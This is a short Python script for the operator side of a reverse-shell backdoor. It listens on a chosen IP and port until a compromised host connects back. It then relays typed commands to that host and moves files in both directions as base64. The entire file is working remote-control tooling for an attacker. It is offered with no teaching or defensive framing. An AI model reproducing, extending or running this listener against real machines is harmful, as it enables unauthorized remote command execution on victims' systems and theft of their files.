import socket
import json
import base64
from argparse import ArgumentParser


class Listener:
    def __init__(self , ip , port):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 0)
            listener.bind((ip , port))
            listener.listen(1)
            print(f'[+] Waiting for incoming connections on port {port}')
            self.conn , addr = listener.accept()
            print(f'[+] Connected to {addr}')

    def send_recieve(self , command):
        json_data = json.dumps(command)
        self.conn.send(json_data.encode())

        if command[0] == "exit" :
            self.conn.close()
            exit()

        json_data = ""
        while True:
            try :
                json_data += self.conn.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue
    
    def download_file(self , path , content):
        with open(path , "wb") as file :
            file.write(base64.b64decode(content))
            return "[+] Download successfuly"
            
    def upload_file(self , path) :
        with open(path , "rb") as file :
            return base64.b64encode(file.read())
        
          
    
    def start(self):
        while True:
            command = input(">> ")
            command = command.split(" ")

            try :
                if command[0] == "upload" :
                    file_content = self.upload_file(command[1])
                    command.append(file_content.decode())

                result = self.send_recieve(command)

                if command[0] == "download" and "[-] Error " not in result:       
                    result = self.download_file(command[1] , result)
            except Exception:
                 result = "[-] Error during command exeution"

            print(result)


def get_arguments():
    parser = ArgumentParser('Define incoming ip and port')
    parser.add_argument('-i' , nargs='?' ,  dest='ip' , help='IP Address of your machine' , required=True)
    parser.add_argument('-p' , nargs='?' , dest='port' , help='Port which you listening for', required=True)
    options = parser.parse_args()
    return options

result = get_arguments()

my_class = Listener(result.ip, int(result.port))
my_class.start()


